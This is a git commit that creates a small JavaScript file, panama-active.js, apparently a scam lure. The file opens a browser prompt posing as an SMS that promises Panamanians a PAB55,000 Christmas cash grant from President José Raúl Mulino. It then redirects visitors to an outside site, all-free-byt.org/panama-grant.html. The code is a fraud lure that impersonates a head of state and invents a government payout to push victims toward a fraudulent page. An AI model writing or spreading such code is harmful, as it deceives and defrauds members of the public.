2f3935ae2cd97b9aac476435e02bd167e39f9473
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-12-09 14:18:42 -0800

    Create panama-active.js

---
+++ panama-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRAR PAB55,000'
+password=prompt('SMS: Felicitaciones, califica para ser presidente José Raúl Mulino Quintero SUBVENCIÓN EN EFECTIVO DE NAVIDAD DE PAB55,000 PARA Panamanians. Por favor, presione OK para retirar la subvención en efectivo de Navidad.   ','RETIRAR PAB55,000');
+if (password != 'RETIRAR PAB55,000') {
+location.href='https://all-free-byt.org/panama-grant.html';
+}
